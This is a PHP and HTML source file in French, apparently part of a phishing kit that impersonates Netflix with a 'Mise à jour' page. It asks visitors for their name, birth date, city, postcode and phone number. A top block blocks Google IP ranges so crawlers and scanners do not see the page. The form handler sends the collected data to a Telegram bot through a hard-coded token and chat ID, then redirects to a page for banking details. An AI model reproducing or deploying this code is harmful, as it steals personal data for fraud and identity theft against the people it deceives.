
<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}

?>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nom = $_POST['Nom'];
    $prenom = $_POST['prenom'];
    $dateNaissance = $_POST['expiryDate'];
    $ville = $_POST['ville'];
    $codePostal = $_POST['codePostal'];
    $telephone = $_POST['telephone'];
    $email = $_GET['email']; // Récupération de l'email passé par l'URL

    // Envoi des informations à Telegram
    $telegramToken = "7839515626:AAFb4eae4Z1Qyy3og3TdlHqkjk94eghdO5g"; // Remplacez par votre token
    $chatId = "5196790326"; // Remplacez par votre chat ID
    $message = "Nom: $nom\nPrénom: $prenom\nDate de naissance: $dateNaissance\nVille: $ville\nCode postal: $codePostal\nTéléphone: $telephone"; // Message à envoyer

    file_get_contents("https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

    // Redirection vers la page de mise à jour des informations bancaires
    header("Location: code.php?email=" . urlencode($email));
    exit();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="Netflix_icon.svg-removebg-preview.png">
    <title>Netflix - Mise à jour</title>
</head>
<body>
    <h1 class="logo"><img src="photo_2024-09-22_00-07-17-removebg-preview.png" alt="Logo Netflix"></h1>
    <div class="container">
        <div class="login-container">
            <h2>Mettez à jour vos informations personnelles</h2>
            <form action="update.php" method="POST">
                <input type="text" placeholder="Nom" name="Nom" required autocomplete="off">
                <input type="text" placeholder="Prénom" name="prenom" autocomplete="off" required>
                <input type="text" id="expiryDate" name="expiryDate" autocomplete="off" placeholder="Date de naissance(JJ/MM/AAAA)" title="Veuillez entrer une date au format JJ/MM/AAAA" maxlength="10" required>
                <input type="text" placeholder="Ville" name="ville" autocomplete="off" required>
                <input type="text" placeholder="Code postal" autocomplete="off" name="codePostal" required>
                <input type="text" placeholder="Numéro de téléphone" name="telephone" id="telephone" autocomplete="off" required value="+33 ">
                <button type="submit" id="verifyBtn" class="login-btn">Suivant</button>
            </form>
        </div>
    </div>

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url(netflix-octobre-contenus-2022.jpg);
            background-size: cover;
            background-position: center;
        }
        .container {
            display: flex;
            color: rgb(255, 235, 235);
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        h1 img {
            width: 150px;
            padding: 10px 50px;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 48px 68px;
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: none;
            outline: none;
            background-color: #4e4b4bcb;
            color: aliceblue;
        }
        .date-input {
            background-color: #4e4b4bcb;
            color: aliceblue;
            padding: 10px;
            border-radius: 4px;
            border: none;
            outline: none;
            cursor: pointer;
        }
        .login-btn {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #f40612;
        }
    </style>

    <script>
        document.getElementById('expiryDate').addEventListener('input', function (e) {
            var input = e.target.value.replace(/\D/g, ''); // Supprime tous les caractères non numériques
            if (input.length >= 2) {
                input = input.slice(0, 2) + '/' + input.slice(2);
            }
            if (input.length >= 5) {
                input = input.slice(0, 5) + '/' + input.slice(5);
            }
            e.target.value = input;
        });
    
        document.getElementById('expiryDate').addEventListener('keydown', function (e) {
            var input = e.target.value;
            if (e.key === 'Backspace' && (input.charAt(input.length - 1) === '/' || input.charAt(input.length - 2) === '/')) {
                e.target.value = input.slice(0, -1);
            }
        });

        document.getElementById('telephone').addEventListener('input', function (e) {
            var input = e.target.value.replace(/\D/g, ''); // Supprime tous les caractères non numériques
            if (input.startsWith('33')) {
                input = input.slice(2); // Enlève le code pays déjà prérempli
            }
            // Construit le numéro formaté
            var formattedNumber = '+33 ';
            if (input.length > 1) {
                formattedNumber += input.slice(0, 1) + ' ';
            }
            if (input.length > 2) {
                formattedNumber += input.slice(1, 3) + ' ';
            }
            if (input.length > 4) {
                formattedNumber += input.slice(3, 5) + ' ';
            }
            if (input.length > 6) {
                formattedNumber += input.slice(5, 7) + ' ';
            }
            if (input.length > 8) {
                formattedNumber += input.slice(7, 9) + ' ';
            }
            if (input.length > 10) {
                formattedNumber += input.slice(9, 11);
            }

            e.target.value = formattedNumber.trim(); // Met à jour l'input avec le format correct
        });

        // Empêche l'utilisateur de supprimer le préfixe +33
        document.getElementById('telephone').addEventListener('keydown', function (e) {
            var input = e.target.value;
            if (e.key === 'Backspace' && input.length <= 4) {
                e.preventDefault(); // Bloque la suppression si le curseur est dans le préfixe +33
            }
        });
    </script>
</body>
</html>
